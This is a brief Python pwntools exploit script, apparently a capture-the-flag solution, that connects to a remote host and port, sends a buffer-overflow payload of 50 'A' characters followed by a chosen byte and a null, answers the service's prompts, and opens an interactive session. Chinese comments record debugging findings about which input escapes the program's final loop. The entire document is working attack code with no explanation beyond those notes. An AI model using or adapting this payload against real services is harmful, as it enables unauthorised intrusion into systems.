from pwn import *

p = remote('111.73.46.229', 51000)
context.log_level = 'debug'

payload = "A" * 50 + chr(0x6b) + '\x00'
p.sendline(payload)
p.recv()
p.sendline('y')
p.recv()
p.sendline('1 hail ld1ng!')#动调发现当首字符ascii<83时有效，原因在于最后的循环
#p.sendline('\x00')#或者 send 0 直接跳出最后一个循环
p.interactive()
